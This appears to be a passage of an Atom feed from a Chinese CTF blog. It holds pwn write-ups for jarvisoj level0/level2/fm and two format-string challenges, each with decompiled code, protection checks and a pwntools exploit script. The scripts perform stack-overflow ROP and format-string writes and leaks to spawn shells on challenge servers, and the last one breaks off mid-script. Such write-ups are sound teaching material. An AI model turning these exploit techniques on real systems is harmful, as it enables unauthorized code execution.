    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level2_x64 WP</title>
    <link href="https://www.fomal.cc/posts/17a38a07.html"/>
    <id>https://www.fomal.cc/posts/17a38a07.html</id>
    <published>2023-04-09T10:13:34.847Z</published>
    <updated>2023-04-09T10:15:46.732Z</updated>
    
    <content type="html"><![CDATA[<p>本地没有打通,写得非常难受的简单题</p><h2 id="1-伪代码">1.伪代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600A90                               public hint</span><br><span class="line">.data:0000000000600A90 2F 62 69 6E 2F 73 68 00       hint db &#x27;/bin/sh&#x27;,0</span><br><span class="line">.data:0000000000600A90                               _data ends</span><br></pre></td></tr></table></figure><h2 id="2-分析漏洞">2.分析漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>只开启了NX保护并且有栈溢出漏洞,而且shift+f12甚至发现.data存了<code>bin/sh</code>,不过本地调试好像有问题,好像是shell不同所以执行<code>system()</code>的时候程序直接结束了,这里我用了临时更换shell的命令不过没切过来,最后用了IDA的偏移量构造了payload,由于是x64程序,所以还需要找到<code>pop rdi ret</code>的gadget才能传参,这里用上了ROPgadget.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./level2_x64 | grep <span class="string">&#x27;pop rdi&#x27;</span></span><br><span class="line">0x00000000004006b3 : pop rdi ; ret</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26459</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./level2_x64&#x27;) ##本地妹有打通</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x80</span>+<span class="number">0x8</span></span><br><span class="line">system=<span class="number">0x04004C0</span></span><br><span class="line">bin_sh=<span class="number">0x0600A90</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4006B3</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本地没有打通,写得非常难受的简单题&lt;/p&gt;
&lt;h2 id=&quot;1-伪代码&quot;&gt;1.伪代码&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level2 1 WP</title>
    <link href="https://www.fomal.cc/posts/cb1b1517.html"/>
    <id>https://www.fomal.cc/posts/cb1b1517.html</id>
    <published>2023-04-09T10:13:34.846Z</published>
    <updated>2023-04-09T10:15:46.732Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-伪代码">1.伪代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>只开启了NX保护,在伪代码里面可以看到调用了<code>system</code>和<code>read</code>,然后输入有栈溢出漏洞,直接搞一下ret2libc1就出了,试着找一下有没有<code>bin/sh</code>或者<code>sh</code>的片段,笔者用pwntools的search找到了<code>sh</code>的片段,不过这里如果传入的是<code>bin/sh</code>的地址会打不通(这条直接在终端输入也是会报出相同的错误(命令不存在)),笔者传入的是<code>sh</code>就打通了.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x88</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read_addr=elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"></span><br><span class="line">system_addr=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh=<span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system_addr)+p32(<span class="number">6</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-伪代码&quot;&gt;1.伪代码&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level0 WP</title>
    <link href="https://www.fomal.cc/posts/60895f25.html"/>
    <id>https://www.fomal.cc/posts/60895f25.html</id>
    <published>2023-04-09T10:13:34.845Z</published>
    <updated>2023-04-09T10:15:46.731Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-伪代码">1.伪代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">callsystem</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">512uLL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>惯例检查,发现是非常初始的ret2text题目,直接栈溢出覆盖返回地址为<code>callsystem()</code>,就能获取shell了.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26917</span>)</span><br><span class="line">call_system=<span class="number">0x400596</span></span><br><span class="line">offset=<span class="number">0x80</span>+<span class="number">0x8</span></span><br><span class="line">payload=cyclic(offset)+p64(call_system)</span><br><span class="line">io.sendafter(<span class="string">&quot;Hello, World\n&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-伪代码&quot;&gt;1.伪代码&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_fm WP</title>
    <link href="https://www.fomal.cc/posts/c43912f5.html"/>
    <id>https://www.fomal.cc/posts/c43912f5.html</id>
    <published>2023-04-09T10:13:34.843Z</published>
    <updated>2023-04-09T10:15:46.731Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要">摘要</h2><p>x86下格式化字符串漏洞的分析和利用,知识点补充在了笔记文章里.</p><h2 id="1-逆向">1.逆向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">80u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>惯例检查一下安全防护,除了PIE几乎都全开了,但是反编译的代码里有很明显的格式化字符串漏洞,需要我们修改.data段上的x为4,就可以调用shell了,我们输入一串<code>%p</code>来找找格式化字符串本体的位置(不是格式化字符串指针的位置).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp   0xffffcf90 —▸ 0xffffcfbc ◂— &#x27;%p%p%p%p%p%p\n&#x27;</span><br><span class="line">01:0004│       0xffffcf94 —▸ 0xffffcfbc ◂— &#x27;%p%p%p%p%p%p\n&#x27;</span><br><span class="line">02:0008│       0xffffcf98 ◂— 0x50 /* &#x27;P&#x27; */</span><br><span class="line">03:000c│       0xffffcf9c —▸ 0xf7ffc7e0 (_rtld_global_ro) ◂— 0x0</span><br><span class="line">04:0010│       0xffffcfa0 ◂— 0x0</span><br><span class="line">05:0014│       0xffffcfa4 ◂— 0x0</span><br><span class="line">06:0018│       0xffffcfa8 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x2bf24</span><br><span class="line">07:001c│       0xffffcfac —▸ 0xffffd0b4 —▸ 0xffffd297 ◂— &#x27;/home/akira/Desktop/fm&#x27;</span><br><span class="line">08:0020│       0xffffcfb0 ◂— 0x0</span><br><span class="line">09:0024│       0xffffcfb4 ◂— 0x534</span><br><span class="line">0a:0028│       0xffffcfb8 ◂— 0xd /* &#x27;\r&#x27; */</span><br><span class="line">0b:002c│ ebx   0xffffcfbc ◂— &#x27;%p%p%p%p%p%p\n&#x27;</span><br></pre></td></tr></table></figure><p>通过调试发现0004处就是格式化字符串的第一个参数,格式化字符串的本体在002c处,也就是格式化字符串的第11个参数,那么我们把要修改的地址填在第11个参数处,然后在后面接上一个<code>%11$n</code>,因为地址刚好是4个字节,所以成功后面的<code>%11$n</code>会把4打印到第11个参数处存放的地址中,修改成功.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28788</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./fm&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">dest=<span class="number">0x804A02C</span></span><br><span class="line">payload=p32(dest)+<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;x86下格式化字符串漏洞的分析和利用,知识点补充在了笔记文章里.&lt;/p&gt;
&lt;h2 id=&quot;1-逆向&quot;&gt;1.逆向&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>hello there Write Up</title>
    <link href="https://www.fomal.cc/posts/6adfc2ee.html"/>
    <id>https://www.fomal.cc/posts/6adfc2ee.html</id>
    <published>2023-04-09T10:13:34.842Z</published>
    <updated>2023-04-09T10:15:46.731Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-源代码">1.源代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buffer_init(argc, argv, envp);</span><br><span class="line">  stream = fopen(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The flag file isn&#x27;t loading. Please contact an organiser if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">32</span>, stream);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What is your name?&quot;</span>);</span><br><span class="line">    fgets(format, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nHello there, &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="2-检查防护措施">2.检查防护措施</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h2 id="3-分析漏洞">3.分析漏洞</h2><p>发现是64位格式化字符串漏洞,只需要我们泄露一下栈上的内存就可以达到目的,由于是63位不知道后面的参数会放在哪里,遂用pwndbg输入%6$p%7$p等试探参数的位置,发现此时的stream字符串(也就是flag)刚好存放在%6$p,即printf()的第7个参数,所以只需要把format布置成%6$s访问即可获取flag.</p><h2 id="4-exp">4.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;/hellothere&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add=<span class="number">0x7fffffffddd0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;What is your name?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;\nHello there, &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>,drop=<span class="literal">True</span>))</span><br></pre></td></tr></table></figure><h2 id="5-反思">5.反思</h2><p>在泄露栈的内存是忽略了printf()的第n个参数是格式化的字符串的第n+1个参数,因为格式化字符串是printf()的第一个参数.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-源代码&quot;&gt;1.源代码&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    <category term="题解" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>format3 Write Up</title>
    <link href="https://www.fomal.cc/posts/8afbe4b2.html"/>
    <id>https://www.fomal.cc/posts/8afbe4b2.html</id>
    <published>2023-04-09T10:13:34.840Z</published>
    <updated>2023-04-09T10:15:46.730Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-防护检查">1.防护检查</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="2-漏洞分析">2.漏洞分析</h2><p>利用格式化字符串漏洞用%n修改.bss段上的key的值就可以获得shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ini(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Format String 3/4&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;here,you must change something...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;leave something.....&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">2023</span> )</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You win!&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&#x27;./format3&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">key=<span class="number">0x60208C</span></span><br><span class="line">pad=<span class="string">b&#x27;%2023c&#x27;</span>+<span class="string">b&#x27;%8$nAAAAAA&#x27;</span>+p64(key)</span><br><span class="line"><span class="comment">#pad=b&#x27;%6$p%7$p&#x27;</span></span><br><span class="line">pause(<span 